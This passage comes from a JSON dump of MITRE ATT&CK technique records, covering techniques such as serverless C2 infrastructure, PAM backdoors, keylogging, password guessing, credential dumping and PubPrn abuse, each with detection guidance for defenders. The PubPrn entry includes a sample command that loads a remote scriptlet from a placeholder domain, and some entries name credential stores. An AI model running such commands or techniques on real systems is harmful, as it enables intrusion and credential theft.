      "detection": "Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.\n\nMonitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. "
    },
    "T1583.007": {
      "id": "T1583.007",
      "name": "Serverless",
      "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1583.007",
      "stix_id": "attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d",
      "created": "2022-07-08T12:39:29.684000+00:00",
      "modified": "2025-04-15T23:06:30.913000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1132.001": {
      "id": "T1132.001",
      "name": "Standard Encoding",
      "description": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1132.001",
      "stix_id": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
      "created": "2020-03-14T23:36:52.095000+00:00",
      "modified": "2025-04-16T20:37:14.817000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1027.009": {
      "id": "T1027.009",
      "name": "Embedded Payloads",
      "description": "Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) \n\nAdversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) \n\nEmbedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1027.009",
      "stix_id": "attack-pattern--0533ab23-3f7d-463f-9bd8-634d27e4dee1",
      "created": "2022-09-30T18:50:14.351000+00:00",
      "modified": "2025-04-15T19:58:03.051000+00:00",
      "platforms": [
        "macOS",
        "Windows",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1556.003": {
      "id": "T1556.003",
      "name": "Pluggable Authentication Modules",
      "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1556.003",
      "stix_id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
      "created": "2020-06-26T04:01:09.648000+00:00",
      "modified": "2025-04-15T22:57:26.573000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\n\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access)."
    },
    "T1578.004": {
      "id": "T1578.004",
      "name": "Revert Cloud Instance",
      "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578.004",
      "stix_id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
      "created": "2020-06-16T18:42:20.734000+00:00",
      "modified": "2025-04-25T14:45:42.495000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Instance: Instance Start",
        "Instance: Instance Metadata",
        "Instance: Instance Stop",
        "Instance: Instance Modification"
      ],
      "defense_bypassed": [],
      "detection": "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
    },
    "T1592": {
      "id": "T1592",
      "name": "Gather Victim Host Information",
      "description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\nAdversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary\u2019s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1592",
      "stix_id": "attack-pattern--09312b1a-c3c6-4b45-9844-3ccc78e5d82f",
      "created": "2020-10-02T16:39:33.966000+00:00",
      "modified": "2025-04-15T22:37:32.347000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1596.003": {
      "id": "T1596.003",
      "name": "Digital Certificates",
      "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596.003",
      "stix_id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
      "created": "2020-10-02T16:58:58.738000+00:00",
      "modified": "2025-04-15T22:18:01.430000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1056.001": {
      "id": "T1056.001",
      "name": "Keylogging",
      "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1056.001",
      "stix_id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
      "created": "2020-02-11T18:58:11.791000+00:00",
      "modified": "2025-04-15T19:58:03.923000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Driver: Driver Load",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes."
    },
    "T1564.012": {
      "id": "T1564.012",
      "name": "File/Path Exclusions",
      "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.012",
      "stix_id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
      "created": "2024-03-29T16:59:10.374000+00:00",
      "modified": "2025-04-15T22:35:31.731000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1222.002": {
      "id": "T1222.002",
      "name": "Linux and Mac File and Directory Permissions Modification",
      "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1222.002",
      "stix_id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
      "created": "2020-02-04T19:24:27.774000+00:00",
      "modified": "2025-04-15T22:46:00.944000+00:00",
      "platforms": [
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Metadata",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, and <code>chmod 777</code>.(Citation: 20 macOS Common Tools and Techniques) \n\nConsider enabling file/directory permission change auditing on folders containing key binary/configuration files."
    },
    "T1110.001": {
      "id": "T1110.001",
      "name": "Password Guessing",
      "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1110.001",
      "stix_id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
      "created": "2020-02-11T18:38:22.617000+00:00",
      "modified": "2025-04-15T19:58:04.272000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices",
        "Office Suite",
        "Identity Provider",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": "Monitor authentication logs for system and application login failures of [Valid Accounts](https://attack.mitre.org/techniques/T1078). If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials."
    },
    "T1216.001": {
      "id": "T1216.001",
      "name": "PubPrn",
      "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1216.001",
      "stix_id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
      "created": "2020-02-03T16:49:57.788000+00:00",
      "modified": "2025-04-16T20:37:14.984000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files."
    },
    "T1597.002": {
      "id": "T1597.002",
      "name": "Purchase Technical Data",
      "description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1597.002",
      "stix_id": "attack-pattern--0a241b6c-7bb2-48f9-98f7-128145b4d27f",
      "created": "2020-10-02T17:05:43.562000+00:00",
      "modified": "2025-04-15T22:58:36.430000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1003": {
      "id": "T1003",
      "name": "OS Credential Dumping",
      "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003",
      "stix_id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
      "created": "2017-05-31T21:30:19.735000+00:00",
      "modified": "2025-04-15T22:53:37.617000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Process: Process Creation",
        "Network Traffic: Network Traffic Flow",
        "File: File Creation",
        "Windows Registry: Windows Registry Key Access",
        "Process: OS API Execution",
        "File: File Access",
        "Process: Process Access",
        "Command: Command Execution",
        "Active Directory: Active Directory Object Access"
      ],
      "defense_bypassed": [],
      "detection": "### Windows\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\n\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)\n\n### Linux\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the `/proc` filesystem for the process being analyzed. This file is stored under the path `/proc/<pid>/maps`, where the `<pid>` directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs."
    },
    "T1129": {
      "id": "T1129",
      "name": "Shared Modules",
      "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1129",
      "stix_id": "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65",
      "created": "2017-05-31T21:31:40.542000+00:00",
      "modified": "2025-04-15T19:58:04.668000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to `%SystemRoot%` and `%ProgramFiles%` directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior."
    },
    "T1602": {
      "id": "T1602",
      "name": "Data from Configuration Repository",
      "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1602",
      "stix_id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
      "created": "2020-10-19T23:46:13.931000+00:00",
      "modified": "2025-04-16T20:37:15.147000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)"
    },
    "T1561.002": {
      "id": "T1561.002",
      "name": "Disk Structure Wipe",
